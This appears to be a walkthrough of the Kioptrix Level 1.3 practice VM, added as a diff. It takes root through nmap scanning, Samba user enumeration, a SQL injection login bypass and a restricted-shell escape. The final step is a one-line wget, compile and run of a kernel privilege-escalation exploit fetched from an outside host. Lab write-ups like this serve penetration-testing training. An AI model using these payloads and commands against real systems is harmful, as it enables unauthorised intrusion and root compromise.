@@ -1,0 +1,125 @@
+*Kioptrix*narrative
+Intro
+    The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player).
+    The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+
+Level 1.3
+    First, run host discovery scan to find the IP belonging to the MAC assigned by VMware:
+    *root@kali:/tmp# nmap -sP 192.168.0.1/24
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-23 16:47 BST
+MAC Address: 00:0C:29:D8:0F:B1 (VMware)
+Nmap scan report for 192.168.0.12*
+
+    Once we know the target, we run a service discovery scan:
+    *# nmap -T5 -sV -A 192.168.0.12
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-23 17:01 BST
+Nmap scan report for 192.168.0.12
+Host is up (0.00043s latency).
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
+MAC Address: 00:0C:29:D8:0F:B1 (VMware)
+OS details: Linux 2.6.9 - 2.6.33
+
+Host script results:
+|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s
+|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name:
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|_  System time: 2017-09-23T13:01:58-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol*
+
+    So it runs SSH, Web and Samba. I run a samba scan against the target:
+    *$ enum4linux 192.168.0.12
+...
+ =============================
+|    Users on 192.168.0.12    |
+ =============================
+index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
+index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
+index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
+index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
+index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)*
+
+    So we know there are three more users in the system.
+
+    I open the web server in the browser and get presented a login page
+    #Kioptrix.1.3.login.png#
+
+    I try to login using Admin and passwords 1234, admin, etc.. It does not work. Next step is to test it against input validation attacks such as SQL injection. Try Simple Sql Injection with *' or '1'='1* and we are shown the following error.
+
+    *Oups, something went wrong with your member's page account.
+Please contact your local Administrator
+ to fix the issue.*
+
+    The URL of the error page looks like:
+
+    *http://192.168.0.12/member.php?username=Admin*
+
+    Next step, is try multiple input validation issues for the username param.
+
+    Sending a dot in the parameter produces the following error:
+
+    * Warning: include() [function.include]: Failed opening './..php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/member.php on line 14*
+
+    I run a directory discovery attack and find the directory *http://192.168.0.12/john/*
+
+    We can use the authentication bypass to log in using credentials *john* and password *' or '1'='1*. However, we are presented the following page:
+    #Kiotrix1.3.password.png#
+
+    I try to log in with that username through SSH:
+    *root@kali:/tmp# ssh john@192.168.0.12
+The authenticity of host '192.168.0.12 (192.168.0.12)' can't be established.
+RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.0.12' (RSA) to the list of known hosts.
+john@192.168.0.12's password:
+Welcome to LigGoat Security Systems - We are Watching
+== Welcome LigGoat Employee ==
+LigGoat Shell is in place so you  don't screw up
+Type '?' or 'help' to get the list of allowed commands
+john:~$*
+
+    We are given a limited shell. We run some commands, google a bit and find out it is a python shell. We can bypass the sandbox by running:
+
+    *john:~$ echo os.system('/bin/bash')
+john@Kioptrix4:~$ *
+
+    Now, we can execute any command. The kernel it uses is vulnerable to a ring0 bug, we can get root with the following exploit:
+    *john@Kioptrix4:~$ wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -o 36038-6; chmod +x 36038-6; ./36038-6
+# bash
+root@Kioptrix4:~# cat /root/congrats.txt
+Congratulations!
+You've got root.
+
+There is more then one way to get root on this system. Try and find them.
+I've only tested two (2) methods, but it doesn't mean there aren't more.
+As always there's an easy way, and a not so easy way to pop this box.
+Look for other methods to get root privileges other than running an exploit.
+
+It took a while to make this. For one it's not as easy as it may look, and
+also work and family life are my priorities. Hobbies are low on my list.
+Really hope you enjoyed this one.
+
+If you haven't already, check out the other VMs available on:
+www.kioptrix.com
+
+Thanks for playing,
+loneferret
+
+root@Kioptrix4:~#*
